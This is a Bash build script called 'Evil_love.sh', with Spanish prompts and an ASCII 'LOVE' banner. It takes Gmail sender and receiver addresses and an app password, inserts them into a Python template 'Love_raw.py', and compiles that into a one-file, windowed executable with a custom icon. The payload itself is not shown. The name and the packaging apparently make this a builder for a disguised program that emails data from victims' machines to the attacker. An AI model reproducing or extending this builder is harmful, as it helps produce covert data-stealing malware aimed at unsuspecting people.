#!/bin/bash 

BOLD="\e[1m"
RED="\e[31m"
BLUE="\e[34m"
RESET="\e[0m"
YELLOW="\e[1;33m"
BACK_GREEN="\e[102m"
BACK_YELLOW="\e[103m"
TPUT_RED=$(tput setaf 196)
TPUT_YELLOW=$(tput setaf 220)
TPUT_BLUE=$(tput setaf 123)
TPUT_RESET=$(tput sgr0)
TPUT_BG_COLOR=$(tput setab 31)


incorrect(){
    echo -e "${RED}[!]${RESET} How to use [./Evil_love.sh] [Sender gmail] [Receiving gmail] [Sender gmail password] 
${RED}[!]${RESET} To obtain the gmail password enter this address |>> ${YELLOW}https://myaccount.google.com/apppasswords${RESET} <<| and enter the issuing account
${RED}"

    exit 2 
}

correct(){
clear
echo -e '\e[31m$$$_____$$$$$$$_$$$$$$$_$$$_______$$$_$$$$$$$$$$
$$$____$$$____$$$____$$$_$$$_____$$$__$$$_______
$$$____$$$_____$_____$$$_$$$_____$$$__$$$_______
$$$_____$$$_________$$$___$$$___$$$___$$$$$$$$__
$$$______$$$_______$$$_____$$$_$$$____$$$_______
$$$_______$$$_____$$$______$$$_$$$____$$$_______
$$$$$$$$$___$$$$$$$_________$$$$$_____$$$$$$$$$$\e[0m\n'

emisor=$1
receptor=$2
pass=$3 
confirm_emi="N"
confirm_rec="N"
confirm_pass="N"
while [[ $confirm_emi == "N" ]] || [[ $confirm_rec == "N" ]] || [[ $confirm_pass == "N" ]]
do 
    echo -e "${TPUT_YELLOW}[?]${TPUT_RESET} Su correo emisor es $emisor? [S/N]"
    read -p "|>> " confirm_emi
    echo -e "${TPUT_YELLOW}[?]${TPUT_RESET} Su correo receptor es $receptor? [S/N]"
    read -p "|>> " confirm_rec
    echo -e "${TPUT_YELLOW}[?]${TPUT_RESET} La contraseña de su correo emisor es $pass? [S/N]"
    read -p "|>> " confirm_pass

    if [[ $confirm_emi == "N" ]] || [[ $confirm_emi == "n" ]]
    then 
        echo -e "${TPUT_YELLOW}[?]${TPUT_RESET} Como es su correo emisor?" 
        read -p "|>> " emisor
        confirm_emi="N"
    elif [[ $confirm_rec == "N" ]] || [[ $confirm_rec == "n" ]]
    then
        echo -e "${TPUT_YELLOW}[?]${TPUT_RESET} Como es su correo receptor?"
        read -p "|>> " receptor
        confirm_rec="N"
    elif [[ $confirm_pass == "N" ]] || [[ $confirm_pass == "n" ]]
    then
        echo -e "${TPUT_YELLOW}[?]${TPUT_RESET} Como es su contraseña de emisor?"
        read -p "|>> " pass
        confirm_pass="N"
    fi

done

cp Love_raw.py Love.py
sed -i "s/Correo_receptor/$receptor/g" Love.py
sed -i "s/Correo_emisor/$emisor/g" Love.py
sed -i "s/Password_emisor/$pass/g" Love.py
pyinstaller --icon=icon.png --windowed --onefile Love.py 

}



if [[ $# -ne 3 ]]
then
    incorrect
elif [[ $# -eq 3 ]]
then
    pass="$3"
    if [[ $1 != *@gmail.com ]] || [[ $2 != *@gmail.com ]] || [[ $3 == *@gmail.com ]] || [[ ${#pass} != 17 ]]
    then
        incorrect
    fi
    correct $1 $2 $3
fi




